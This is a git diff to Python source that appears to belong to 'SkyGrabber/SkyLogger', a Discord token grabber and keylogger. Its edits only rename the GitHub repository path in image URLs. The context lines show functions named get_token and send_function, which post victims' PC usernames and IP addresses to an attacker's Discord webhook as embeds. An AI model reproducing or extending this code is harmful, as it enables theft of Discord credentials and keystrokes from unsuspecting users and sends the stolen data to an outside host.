@@ -218,7 +218,7 @@ def get_token():
 
                         webhook2 = DiscordWebhook(url=webhook_url, username="SkyGrabber")
 
-                        webhook2.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger/main/img/avatar.jpg"
+                        webhook2.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/avatar.jpg"
 
                         embed2 = DiscordEmbed(title='SkyGrabber | Token Grabber',
                                               description=f"**{pc_username} | {ip}**", color='d17823')
@@ -237,7 +237,7 @@ def get_token():
                             url="https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4")
 
                         embed2.set_footer(text='SkyGrabber',
-                                          icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger/main/img/footer_avatar.jpg')
+                                          icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/footer_avatar.jpg')
 
                         embed2.set_timestamp()
                         webhook2.add_embed(embed2)
@@ -263,7 +263,7 @@ def send_function():
 
     webhook = DiscordWebhook(url=webhook_url, username="SkyLog")
 
-    webhook.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger/main/img/avatar.jpg"
+    webhook.avatar_url = "https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/avatar.jpg"
 
     webhook.content = "@everyone" if ping_me else ""
 
@@ -280,7 +280,7 @@ def send_function():
         url="https://avatars.githubusercontent.com/u/33034795?s=400&u=fbfb434dac6b0252e69ae4ceb12337ca19f95df3&v=4")
 
     embed.set_footer(text='SkyLogger',
-                     icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger/main/img/footer_avatar.jpg')
+                     icon_url='https://raw.githubusercontent.com/Skyrlanie/SkyLogger-SkyGrabber-TokenGrabber-Keylogger/main/img/footer_avatar.jpg')
 
     embed.set_timestamp()
     webhook.add_embed(embed)
